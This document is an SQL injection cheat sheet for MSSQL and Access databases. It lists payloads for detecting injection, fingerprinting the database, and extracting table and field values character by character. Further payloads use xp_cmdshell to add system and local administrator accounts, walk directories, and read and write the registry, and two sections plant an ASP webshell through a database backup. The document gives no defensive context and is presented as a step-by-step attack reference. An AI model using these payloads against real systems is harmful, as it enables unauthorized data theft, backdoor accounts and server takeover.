---

1. Determine if there is an injection; `and 1=1`; `and 1=2`

2. Preliminarily determine if it's MSSQL; `and user>0`

3. Injection parameter is a character: `'and [query condition] and ''='`

4. When searching, no filtering of parameters: `'and [query condition] and '%25'='`

5. Determine the database system:

`;and (select count(*) from sysobjects)>0` - MSSQL

`;and (select count(*) from msysobjects)>0` - Access

6. Guess the database:

`;and (select Count(*) from [database name])>0`

7. Guess the table fields:

`;and (select Count(field name) from database name)>0`

8. Guess the length of records in the field:

`;and (select top 1 len(field name) from database name)>0`

9. Manually guess the field:

(1) Guess the ASCII value of the field (Access):

`;and (select top 1 asc(mid(field name,1,1)) from database name)>0`

(2) Guess the ASCII value of the field (MSSQL):

`;and (select top 1 unicode(substring(field name,1,1)) from database name)>0`

10. Test permission structure (MSSQL):

`;and 1=(select IS_SRVROLEMEMBER('sysadmin'));--`

`;and 1=(select IS_SRVROLEMEMBER('serveradmin'));--`

`;and 1=(select IS_SRVROLEMEMBER('setupadmin'));--`

`;and 1=(select IS_SRVROLEMEMBER('securityadmin'));--`

`;and 1=(select IS_SRVROLEMEMBER('diskadmin'));--`

`;and 1=(select IS_SRVROLEMEMBER('bulkadmin'));--`

`;and 1=(select IS_MEMBER('db_owner'));--`

11. Add MSSQL and system accounts:

`;exec master.dbo.sp_addlogin username;--`

`;exec master.dbo.sp_password null,username,password;--`

`;exec master.dbo.sp_addsrvrolemember sysadmin username;--`

`;exec master.dbo.xp_cmdshell 'net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';--`

`;exec master.dbo.xp_cmdshell 'net user username password /add';--`

`;exec master.dbo.xp_cmdshell 'net localgroup administrators username /add';--`

12. (1) Traverse directories:

`;create table dirs(paths varchar(100), id int)`

`;insert dirs exec master.dbo.xp_dirtree 'c:\'`

`;and (select top 1 paths from dirs)>0`

`;and (select top 1 paths from dirs where paths not in('paths obtained from previous step'))>)`

(2) Traverse directories:

`;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--`

`;insert temp exec master.dbo.xp_availablemedia;--` Get all current drives

`;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--` Get subdirectory list

`;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';--` Get directory tree of all subdirectories

`;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';--` View file content

13. Stored procedures in MSSQL:

`xp_regenumvalues` Registry root key, subkey

`;exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run'` Returns all key values as multiple record sets

`xp_regread` Root key, subkey, value name

`;exec xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','CommonFilesDir'` Returns the specified key value

`xp_regwrite` Root key, subkey, value name, value type, value

There are two value types: `REG_SZ` indicates string type, `REG_DWORD` indicates integer type

`;exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName','reg_sz','hello'` Writes to the registry

`xp_regdeletevalue` Root key, subkey, value name

`exec xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName'` Deletes a specific value

`xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Testkey'` Deletes a key, including all values under that key

14. Create a webshell using MSSQL backup:

`use model`

`create table cmd(str image);`

`insert into cmd(str) values ('');`

`backup database model to disk='c:\amxking.asp';`

15. Built-in functions in MSSQL:

`;and (select @@version)>0` Get the Windows version number

`;and user_name()='dbo'` Determine if the current system connection user is SA

`;and (select user_name())>0` Expose the current system connection user

`;and (select db_name())>0` Get the currently connected database

16. A concise webshell:

`use model`

`create table cmd(str image);`

`insert into cmd(str) values ('');`

`backup database model to disk='g:\wwwtest\amxking.asp';`
